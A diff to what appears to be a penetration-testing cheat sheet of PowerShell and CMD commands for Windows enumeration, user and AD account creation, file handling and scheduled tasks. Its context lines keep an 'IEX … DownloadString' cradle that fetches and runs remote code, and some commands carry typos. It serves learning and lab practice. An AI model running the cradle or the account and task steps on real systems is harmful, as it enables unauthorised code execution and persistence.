@@ -104,6 +104,300 @@ Full list of approved verbs can be found [here](https://docs.microsoft.com/en-us
 * "IEX (New-Object Net.WebClient).DownloadString('URL')"
   * IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.52:8000/test.txt')
 
+## General
+
+**PowerShell Extensions**
+
+* .ps1 - Executable script
+* .psd1 - Details contents of the Powershell modules in a table of key/value pairs
+* .psm1 - Powershell module file
+
+### List Domain Controllers
+
+```
+netdom query DC
+```
+
+### View command history
+
+```
+Get-Histtory # Powershell
+doskey /history # CMD
+```
+
+### Listing the Contents of the File System
+
+```
+tree
+```
+
+### Listing the Contents of the File System with files
+
+```
+tree /F
+```
+
+### View file contents
+
+```
+Get-Contents FILE
+```
+
+### General system info
+
+```
+systeminfo
+```
+
+### See hosts that have come into contact with our machine
+
+```
+arp /a
+```
+
+### View current privileges of our user
+
+```
+whoami /priv
+```
+
+### View groups our user is in
+
+```
+whoami /groups
+```
+
+### View all active services
+
+```
+sc query type= service
+```
+
+### Stop a service
+
+```
+sc stop SERVICE
+```
+
+### Start a service
+
+```
+sc start SERVICE
+```
+
+### See available modules
+
+```
+Get-Module -ListAvailable
+```
+
+### Import a module
+
+```
+Import-Module .\FILE
+```
+
+### View Execution Policy
+
+```
+Get-ExecutionPolicy 
+```
+
+### Change Execution Polixy
+
+```
+Set-ExecutionPolicy undefined/restricted/unrestricted/
+```
+
+### View Local Groups
+
+```
+get-localgroup
+```
+
+### View Local Users
+
+```
+Get-LocalUser
+```
+
+### Adding a new user
+
+```
+New-LocalUser -Name "USERNAME" -NoPassword
+```
+
+### Add password to new user
+
+```
+$Password = Read-Host -AsSecureString
+Set-LocalUser -Name "USERNAME" -Password $Password -Description "DESCRIPTION"
+```
+
+### Add user to local group
+
+```
+Add-LocalGroupMember -Group "GROUP" -Member "USERNAME"
+```
+
+### Download file
+
+```
+Invoke-WebRequest -Uri "URL" -OutFile "/path/FILENAME"
+(New-Object Net.WebClient).DownloadFile("URL, "/path/FILENAME")
+```
+
+## AD-Module
+
+### List AD Users
+
+```
+Get-ADUser -Filter *
+Get-ADUser -Identity USERNAME
+```
+
+### Add new AD user
+
+```
+New-ADUser -Name "USERNAME" -Surname "LASTAME" -GivenName "FIRSTNAME" -Office "Security" -OtherAttributes @{'mail'="USERNAME@DOMAIN"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
+```
+
+## Creating/Moving/Deleting Files & Directories
+
+### Show files in current directory
+
+```
+dir
+```
+
+### Show hidden files in current directory
+
+```
+dir /A:H
+```
+
+### Retrieve an object
+
+```
+Get-Item
+```
+
+### Lists out the content of a folder or registry hive.
+
+```
+Get-ChildItem
+```
+
+### Create new objects.
+
+```
+New-Item
+```
+
+Modify the property values of an object.
+
+```
+Set-Item
+```
+
+### Copy Item
+
+```
+Copy-Item
+```
+
+### Rename item
+
+```
+Rename-Item
+```
+
+### Delete item
+
+```
+Remove-Item
+```
+
+### Displays the content within a file or object.
+
+```
+Get-Content
+```
+
+### Append content to a file.
+
+```
+Add-Content
+```
+
+### Overwrite any content in a file with new data.
+
+```
+Set-Content
+```
+
+### Clear the content of the files without deleting the file itself.
+
+```
+Clear-Content
+```
+
+### Compare two or more objects against each other. This includes the object itself and the content within.
+
+```
+Compare-Object
+```
+
+## Scheduled Tasks
+
+### View currently scheduled tasks
+
+```
+SCHTASKS /Query /V /FO list
+```
+
+### Create Syntax
+
+| **Action**                                                                                            | **Parameter** | **Description**                                                                                                               |
+| ----------------------------------------------------------------------------------------------------- | ------------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| `Create`                                                                                              |               | Schedules a task to run.                                                                                                      |
+|                                                                                                       | /sc           | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.      |
+|                                                                                                       | /tn           | Sets the name for the task we are building. Each task must have a unique name.                                                |
+|                                                                                                       | /tr           | Sets the trigger and task that should be run. This can be an executable, script, or batch file.                               |
+|                                                                                                       | /s            | Specify the host to run on, much like in Query.                                                                               |
+|                                                                                                       | /u            | Specifies the local user or domain user to utilize                                                                            |
+|                                                                                                       | /p            | Sets the Password of the user-specified.                                                                                      |
+|                                                                                                       | /mo           | Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.                       |
+|                                                                                                       | /rl           | Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value. |
+|                                                                                                       | /z            | Will set the task to be deleted after completion of its actions.                                                              |
+| Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following: |               |                                                                                                                               |
+
+* `/create` : to tell it what we are doing
+* `/sc` : we must set a schedule
+* `/tn` : we must set the name
+* `/tr` : we must give it an action to take
+
+### Change Syntax
+
+| **Action** | **Parameter** | **Description**                                    |
+| ---------- | ------------- | -------------------------------------------------- |
+| `Change`   |               | Allows for modifying existing scheduled tasks.     |
+|            | /tn           | Designates the task to change                      |
+|            | /tr           | Modifies the program or action that the task runs. |
+|            | /ENABLE       | Change the state of the task to Enabled.           |
+|            | /DISABLE      | Change the state of the task to Disabled.          |
+
+### Delete Syntax
+
+| **Action** | **Parameter** | **Description**                                           |
+| ---------- | ------------- | --------------------------------------------------------- |
+| `Delete`   |               | Remove a task from the schedule                           |
+|            | /tn           | Identifies the task to delete.                            |
+|            | /s            | Specifies the name or IP address to delete the task from. |
+|            | /u            | Specifies the user to run the task as.                    |
+|            | /p            | Specifies the password to run the task as.                |
+|            | /f            | Stops the confirmation warning.                           |
+
 ## Additional resources
 
 [TryHackMe Hacking With Powershell](https://tryhackme.com/room/powershell)
